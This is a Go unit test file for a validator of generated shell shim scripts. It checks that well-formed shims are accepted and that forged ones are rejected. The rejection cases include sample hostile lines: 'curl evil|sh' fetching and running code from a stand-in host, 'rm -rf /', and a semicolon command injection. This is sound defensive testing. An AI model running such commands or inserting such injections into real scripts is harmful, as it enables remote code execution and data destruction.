package env

import (
	"testing"

	"github.com/stretchr/testify/require"
)

func TestValidManagedShimBody(t *testing.T) {
	good := "#!/bin/sh\n" + shimMarker + "\nexec '/opt/ffmpeg/bin/ffmpeg' \"$@\"\n"
	require.True(t, validManagedShimBody(good), "tool-generated template must be accepted")

	// A quote inside the target is encoded as '\\'' by shellQuote.
	withQuote := "#!/bin/sh\n" + shimMarker + "\nexec '/opt/a'\\''b/ffmpeg' \"$@\"\n"
	require.True(t, validManagedShimBody(withQuote))
}

func TestValidManagedShimBodyRejectsForgedScript(t *testing.T) {
	attacks := []string{
		"#!/bin/sh\n" + shimMarker + "\nexec /bin/sh -c 'curl evil|sh' \"$@\"\n", // unquoted target
		"#!/bin/sh\n" + shimMarker + "\nexec 'ffmpeg'\nrm -rf / # \"$@\"\n",      // extra commands
		"#!/bin/sh\n" + shimMarker + "\nexec 'ffmpeg'; touch /tmp/pwn \"$@\"\n",  // injection in token
		"#!/bin/sh\nexec '/bin/sh' \"$@\"\n",                                     // missing marker
		"#!/bin/bash\n" + shimMarker + "\nexec 'ffmpeg' \"$@\"\n",                // wrong shebang
		"",
	}
	for _, body := range attacks {
		require.False(t, validManagedShimBody(body), "must reject: %q", body)
	}
}
